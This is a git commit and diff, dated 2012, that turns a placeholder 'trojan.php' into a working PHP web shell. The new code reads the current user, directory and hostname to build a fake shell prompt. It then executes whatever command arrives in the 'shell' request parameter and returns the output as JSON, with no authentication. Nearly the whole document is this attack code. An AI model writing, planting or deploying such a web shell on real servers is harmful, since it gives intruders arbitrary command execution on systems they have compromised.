086a83d22a3c72f40a5c11fd0484c76608d107d2
Chris Lane <chris@chris-allen-lane.com>
2012-11-21 23:44:57 -0500

    Hacked out a slightly more functional trojan.

--- trojans/plaintext/trojan.php
+++ trojans/plaintext/trojan.php
@@ -1,8 +1,18 @@
 <?php
 
+// assemble the prompt context
+$whoami          =  trim(`whoami`);
+$cwd             =  trim(`pwd`);
+$hostname        =  trim(`hostname`);
+$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
+$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";
+
+// generate the output
+$output          = `{$_REQUEST['shell']}`;
+
 $response = array(
-    'prompt_context' => '/home/chris/Desktop$',
-    'output'         => 'This is output',
+    'prompt_context' => $prompt_context,
+    'output'         => $output,
 );
 
 $json = json_encode($response);
